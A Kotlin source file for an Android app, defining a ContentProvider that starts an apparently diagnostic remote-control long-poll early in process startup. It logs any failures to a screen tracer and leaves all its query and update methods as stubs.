// [REMOTE_HOOK v0.57] — ContentProvider that boots the remote-control
// long-poll early in process bootstrap (initOrder=9997, just under
// CrashCatcher=9999 + RustLibgmSmoke=9998 so those still fire first).
package com.textrcs.control

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.textrcs.diag.ScreenTracer

class RemoteControlProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        try {
            Log.i(TAG, "RemoteControl bootstrap")
            val ctx = context
            if (ctx == null) {
                ScreenTracer.note("CTRL provider: context==null at onCreate")
                return true
            }
            RemoteControl.start(ctx)
        } catch (t: Throwable) {
            Log.w(TAG, "RemoteControl.start() failed: ${t.javaClass.simpleName}: ${t.message}", t)
            try { ScreenTracer.note("CTRL bootstrap FAIL ${t.javaClass.name}: ${t.message}") } catch (_: Throwable) {}
        }
        return true
    }

    override fun query(uri: Uri, projection: Array<out String>?, selection: String?, selectionArgs: Array<out String>?, sortOrder: String?): Cursor? = null
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<out String>?): Int = 0

    companion object {
        private const val TAG = "RemoteControlProvider"
    }
}
